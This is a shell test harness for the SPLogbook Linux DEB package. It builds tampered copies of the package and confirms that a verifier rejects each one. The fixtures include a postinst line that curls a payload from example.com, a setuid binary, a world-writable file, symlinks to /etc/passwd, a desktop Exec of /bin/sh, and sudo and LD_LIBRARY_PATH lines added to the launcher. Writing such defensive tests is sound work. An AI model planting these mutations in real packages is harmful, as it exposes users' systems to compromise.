#!/bin/sh
# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Mariusz Woźniak (SP6INA)
#
# Fail-closed negative fixture harness for the SPLogbook Linux amd64 DEB (M3-H).
#
# Every fixture is a safe, disposable mutation of the real package. The job
# succeeds ONLY because each mutation is rejected by scripts/verify_linux_deb.sh
# with a non-zero exit code and without any success message. The real package,
# the host package database and the user's home are never modified.
#
# Usage:
#   EXPECTED_BUILD_COMMIT=<40-hex> \
#     sh scripts/verify_linux_deb_negative_fixture.sh <verifier> <package.deb>

set -eu

VERIFIER="${1:-scripts/verify_linux_deb.sh}"
DEB="${2:-}"
EXPECTED_COMMIT="${EXPECTED_BUILD_COMMIT:-}"
EXPECTED_ICON_SHA256="${EXPECTED_ICON_SHA256:-}"
EXPECTED_DESKTOP_SHA256="${EXPECTED_DESKTOP_SHA256:-}"

if [ -z "${DEB}" ] || [ ! -f "${DEB}" ]; then
    printf 'FAIL: usage: %s <verifier> <package.deb>\n' "$0" >&2
    exit 1
fi
[ -f "${VERIFIER}" ] || {
    printf 'FAIL: verifier does not exist: %s\n' "${VERIFIER}" >&2
    exit 1
}
DEB="$(cd "$(dirname "${DEB}")" && pwd)/$(basename "${DEB}")"
VERIFIER="$(cd "$(dirname "${VERIFIER}")" && pwd)/$(basename "${VERIFIER}")"
for tool in dpkg-deb sha256sum ar grep awk mktemp find sed head printf; do
    command -v "${tool}" >/dev/null 2>&1 || {
        printf 'FAIL: required tool is missing: %s\n' "${tool}" >&2
        exit 1
    }
done

WORK="$(mktemp -d "${TMPDIR:-/tmp}/splogbook-deb-negative.XXXXXX")"
cleanup() {
    rm -rf "${WORK}"
}
trap cleanup EXIT HUP INT TERM

TOTAL=0
REJECTED=0

fail() {
    printf 'FAIL: %s\n' "$*" >&2
    exit 1
}

rebuild() {
    dpkg-deb --root-owner-group -Zxz --build "$1/root" "$1/pkg.new" >/dev/null
    mv "$1/pkg.new" "$1/pkg.deb"
}

expect_reject() {
    name="$1"
    mutation="$2"
    TOTAL=$((TOTAL + 1))
    CASE="${WORK}/case-${TOTAL}"
    mkdir -p "${CASE}"
    cp "${DEB}" "${CASE}/pkg.deb"
    sha256sum "${CASE}/pkg.deb" > "${CASE}/pkg.deb.sha256"
    KEEP_SIDECAR=0
    "${mutation}" "${CASE}" || fail "mutation setup failed: ${name}"
    if [ "${KEEP_SIDECAR}" = "0" ]; then
        ( cd "${CASE}" && sha256sum pkg.deb > pkg.deb.sha256 )
    fi
    set +e
    SPLOG_DEB_INSPECTION_ONLY=1 \
    SPLOG_DEB_SKIP_LINTIAN=1 \
    EXPECTED_BUILD_COMMIT="${EXPECTED_COMMIT}" \
    EXPECTED_ICON_SHA256="${EXPECTED_ICON_SHA256}" \
    EXPECTED_DESKTOP_SHA256="${EXPECTED_DESKTOP_SHA256}" \
        sh "${VERIFIER}" "${CASE}/pkg.deb" > "${CASE}/log" 2>&1
    CODE=$?
    set -e
    if [ "${CODE}" -eq 0 ]; then
        printf '\n--- fixture log (%s) ---\n' "${name}"
        cat "${CASE}/log"
        fail "fixture was NOT rejected (exit 0): ${name}"
    fi
    if grep -q "COMPLETED SUCCESSFULLY" "${CASE}/log"; then
        printf '\n--- fixture log (%s) ---\n' "${name}"
        cat "${CASE}/log"
        fail "fixture emitted a success message: ${name}"
    fi
    REJECTED=$((REJECTED + 1))
    printf 'REJECTED %-28s exit=%s\n' "${name}" "${CODE}"
}

# --- package-integrity mutations -------------------------------------
mutate_missing_sha() {
    rm -f "$1/pkg.deb.sha256"
    KEEP_SIDECAR=1
}
mutate_wrong_sha() {
    printf '0000000000000000000000000000000000000000000000000000000000000000  pkg.deb\n' > "$1/pkg.deb.sha256"
    KEEP_SIDECAR=1
}
mutate_truncated() {
    head -c 4096 "$1/pkg.deb" > "$1/pkg.deb.tmp"
    mv "$1/pkg.deb.tmp" "$1/pkg.deb"
}
mutate_missing_control() {
    member="$(ar t "$1/pkg.deb" | grep '^control\.tar' | head -n 1)"
    [ -n "${member}" ] || fail "control member not found"
    ar d "$1/pkg.deb" "${member}" >/dev/null
}

# --- control metadata mutations --------------------------------------
mutate_bad_arch() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's/^Architecture: .*/Architecture: arm64/' "$1/root/DEBIAN/control"
    rebuild "$1"
}
mutate_bad_depends() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's/libgtk-3-0t64, //' "$1/root/DEBIAN/control"
    rebuild "$1"
}
mutate_bad_installed_size() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's/^Installed-Size: .*/Installed-Size: 1/' "$1/root/DEBIAN/control"
    rebuild "$1"
}
mutate_missing_maintainer() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i '/^Maintainer: /d' "$1/root/DEBIAN/control"
    rebuild "$1"
}

# --- payload mutations -----------------------------------------------
mutate_missing_binary() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/SPLogbook"
    rebuild "$1"
}
mutate_missing_updater() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/splogbook-updater"
    rebuild "$1"
}
mutate_missing_hamlib() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/lib/libhamlib.so.4"
    rebuild "$1"
}
mutate_missing_launcher() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/usr/bin/splogbook"
    rebuild "$1"
}
mutate_launcher_mode() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    chmod 0644 "$1/root/usr/bin/splogbook"
    rebuild "$1"
}
mutate_launcher_sudo() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    printf 'sudo /bin/true\n' >> "$1/root/usr/bin/splogbook"
    rebuild "$1"
}
mutate_launcher_ldpath() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    printf 'LD_LIBRARY_PATH=/tmp\n' >> "$1/root/usr/bin/splogbook"
    rebuild "$1"
}
mutate_bad_exec() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's|^Exec=.*|Exec=/bin/sh|' "$1/root/usr/share/applications/splogbook.desktop"
    rebuild "$1"
}
mutate_missing_icon() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/usr/share/icons/hicolor/256x256/apps/splogbook.png"
    rebuild "$1"
}
mutate_missing_marker() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/.splogbook-deb-marker"
    rebuild "$1"
}
mutate_bad_commit() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's/"build_commit": "[0-9a-f]*"/"build_commit": "1111111111111111111111111111111111111111"/' \
        "$1/root/opt/SPLogbook/.splogbook-deb-marker"
    rebuild "$1"
}
mutate_bad_glibc() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    sed -i 's/"maximum_glibc": "2.43"/"maximum_glibc": "2.44"/' \
        "$1/root/opt/SPLogbook/.splogbook-deb-marker"
    rebuild "$1"
}
mutate_user_data() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    printf 'USER_QSO_DATABASE\n' > "$1/root/opt/SPLogbook/default_log.db"
    rebuild "$1"
}
mutate_setuid() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    chmod 4755 "$1/root/opt/SPLogbook/SPLogbook"
    rebuild "$1"
}
mutate_world_writable() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    chmod 0666 "$1/root/opt/SPLogbook/LICENSE"
    rebuild "$1"
}
mutate_symlink_absolute() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/LICENSE"
    ln -s /etc/passwd "$1/root/opt/SPLogbook/LICENSE"
    rebuild "$1"
}
mutate_symlink_traversal() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    rm -f "$1/root/opt/SPLogbook/LICENSE"
    ln -s ../../../../etc/passwd "$1/root/opt/SPLogbook/LICENSE"
    rebuild "$1"
}

# --- maintainer-script mutations -------------------------------------
mutate_postinst_home() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    printf 'HOME=/tmp\n' >> "$1/root/DEBIAN/postinst"
    rebuild "$1"
}
mutate_postinst_network() {
    dpkg-deb -R "$1/pkg.deb" "$1/root"
    printf 'curl http://example.com/payload\n' >> "$1/root/DEBIAN/postinst"
    rebuild "$1"
}

echo "=================================================================="
echo "SPLogbook DEB negative fixtures (M3-H)"
echo "Package: ${DEB}"
echo "Verifier: ${VERIFIER}"
echo "=================================================================="

expect_reject "missing .sha256" mutate_missing_sha
expect_reject "wrong SHA-256" mutate_wrong_sha
expect_reject "truncated DEB" mutate_truncated
expect_reject "missing control.tar" mutate_missing_control
expect_reject "wrong Architecture" mutate_bad_arch
expect_reject "incomplete Depends" mutate_bad_depends
expect_reject "wrong Installed-Size" mutate_bad_installed_size
expect_reject "missing Maintainer" mutate_missing_maintainer
expect_reject "missing main binary" mutate_missing_binary
expect_reject "missing updater" mutate_missing_updater
expect_reject "missing libhamlib" mutate_missing_hamlib
expect_reject "missing launcher" mutate_missing_launcher
expect_reject "launcher mode 0644" mutate_launcher_mode
expect_reject "launcher uses sudo" mutate_launcher_sudo
expect_reject "launcher LD_LIBRARY_PATH" mutate_launcher_ldpath
expect_reject "dangerous desktop Exec" mutate_bad_exec
expect_reject "missing icon" mutate_missing_icon
expect_reject "missing marker" mutate_missing_marker
expect_reject "wrong build_commit" mutate_bad_commit
expect_reject "GLIBC above 2.43" mutate_bad_glibc
expect_reject "user data in package" mutate_user_data
expect_reject "setuid binary" mutate_setuid
expect_reject "world-writable file" mutate_world_writable
expect_reject "absolute symlink" mutate_symlink_absolute
expect_reject "traversal symlink" mutate_symlink_traversal
expect_reject "postinst uses HOME" mutate_postinst_home
expect_reject "postinst uses network" mutate_postinst_network

if [ "${REJECTED}" -ne "${TOTAL}" ]; then
    fail "only ${REJECTED}/${TOTAL} fixtures were rejected"
fi

echo "=================================================================="
echo "NEGATIVE FIXTURES REJECTED AS EXPECTED: ${REJECTED}/${TOTAL}"
echo "=================================================================="
